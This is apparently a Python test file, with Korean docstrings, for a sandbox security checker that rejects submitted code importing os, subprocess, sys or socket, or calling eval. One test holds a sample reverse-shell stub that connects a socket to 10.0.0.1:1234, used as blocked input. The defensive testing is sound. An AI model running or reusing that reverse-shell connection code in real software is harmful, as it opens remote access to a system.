import os
import sys

import pytest

# Add worker directory to sys.path to import SecurityChecker
sys.path.append(os.path.join(os.path.dirname(__file__), "../../../worker"))

from security import SecurityChecker, SecurityViolation  # noqa: E402


def test_security_check_valid_code():
    """유효한 코드가 보안 검사를 통과하는지 테스트합니다."""
    checker = SecurityChecker()
    code = """
def add(a, b):
    return a + b
print(add(1, 2))
"""
    # Should not raise exception
    checker.check_code(code)


def test_security_check_header_forbidden_import():
    """금지된 모듈(os) 임포트 시 보안 위반이 발생하는지 테스트합니다."""
    checker = SecurityChecker()
    with pytest.raises(
        SecurityViolation, match="보안 위반이 감지되었습니다: 금지된 모듈 임포트: os"
    ):
        checker.check_code("import os")


def test_security_check_forbidden_import_from():
    """금지된 모듈(subprocess)에서 임포트 시 보안 위반이 발생하는지 테스트합니다."""
    checker = SecurityChecker()
    # Unused variable removed
    with pytest.raises(SecurityViolation, match="금지된 모듈에서 임포트: subprocess"):
        checker.check_code("from subprocess import call")


def test_security_check_forbidden_function_call():
    """금지된 함수(eval) 호출 시 보안 위반이 발생하는지 테스트합니다."""
    checker = SecurityChecker()
    # Unused variable removed
    with pytest.raises(SecurityViolation, match="금지된 함수 호출: eval"):
        checker.check_code("eval('print(1)')")


def test_security_check_complex_malicious_code():
    """복합적인 악성 코드(소켓 연결 시도 등)가 차단되는지 테스트합니다."""
    checker = SecurityChecker()
    code = """
import sys
import socket

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 1234))
"""
    with pytest.raises(SecurityViolation) as excinfo:
        checker.check_code(code)

    assert "금지된 모듈 임포트: sys" in str(excinfo.value)
    assert "금지된 모듈 임포트: socket" in str(excinfo.value)
